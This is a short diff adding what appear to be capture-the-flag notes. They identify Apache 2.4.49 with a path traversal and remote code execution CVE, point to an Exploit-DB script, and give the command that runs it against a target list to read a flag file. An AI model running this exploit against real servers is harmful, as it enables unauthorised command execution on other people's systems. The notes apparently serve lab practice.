@@ -1,0 +1,10 @@
+services:
+
+http
+apache 2.4.49 - path traverse and rce cve
+
+
+sources:
+
+https://www.exploit-db.com/exploits/50383 - 50383.sh
+./50383.sh targets.txt /bin/bash "cat /home/user/flag"
